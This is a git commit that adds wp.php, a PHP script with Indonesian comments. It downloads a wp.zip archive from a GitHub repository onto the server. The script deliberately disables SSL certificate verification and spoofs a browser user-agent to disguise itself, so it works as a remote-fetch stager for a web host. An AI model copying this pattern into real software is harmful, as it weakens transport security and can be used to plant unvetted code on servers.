274a336de11fcd629285470ed5449a480897f20d
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-01-19 16:01:02 +0700

    Create wp.php

---
+++ wp.php
@@ -0,0 +1,27 @@
+<?php
+$url = "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/wp.zip";
+$zipFile = "wp.zip"; 
+
+echo "Sedang mencoba download dari GitHub...<br>";
+
+$fp = fopen($zipFile, 'w+');
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_TIMEOUT, 300);
+curl_setopt($ch, CURLOPT_FILE, $fp); 
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Matikan cek SSL (PENTING!)
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0'); // Nyamar jadi browser
+
+$exec = curl_exec($ch);
+$info = curl_getinfo($ch);
+curl_close($ch);
+fclose($fp);
+
+if ($exec && $info['http_code'] == 200) {
+    echo "<b>SUKSES BROK!</b> File $zipFile berhasil ditarik.<br>";
+    echo "Ukuran: " . filesize($zipFile) . " bytes.";
+} else {
+    echo "<b>GAGAL!</b> Cek permission folder atau koneksi server.<br>";
+    echo "Error Info: " . print_r($info, true);
+}
+?>
